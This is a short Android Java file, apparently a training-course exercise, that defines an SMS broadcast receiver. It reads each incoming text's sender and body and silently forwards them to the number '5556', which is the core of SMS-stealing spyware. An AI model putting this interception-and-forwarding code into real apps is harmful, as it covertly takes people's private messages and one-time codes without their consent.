package com.itheima.sms_monitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SmsMonitorReceiver extends BroadcastReceiver {

	/**
	 * 	1. 接受短信到来的广播
		2. 获取传输的二进制的短信数据
		3. 获取短信对象
			3.1 获取手机号码
			3.2 获取短信内容
		4. 转发短信
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
			//获取传输的二进制的短信数据
			Bundle bundle = intent.getExtras();
			//pdus:pdu协议数据单元(Protocol Data Unit),短信工业标准
			Object[] object = (Object[]) bundle.get("pdus");//短信有字数限制,所以是数组
			for(Object obj : object){
				//获取短信对象
				SmsMessage sms = SmsMessage.createFromPdu((byte[])obj);
				//获取手机号码
				String phoneNum = sms.getOriginatingAddress();
				//获取短信内容
				String body = sms.getMessageBody();
				System.out.println("手机号码："+phoneNum+" 短信内容："+body);
				
				//转发短信
				SmsManager sm = SmsManager.getDefault();
				sm.sendTextMessage("5556", null, "phonenum:"+phoneNum+" body:"+body, null, null);
			}
		}
	}
}
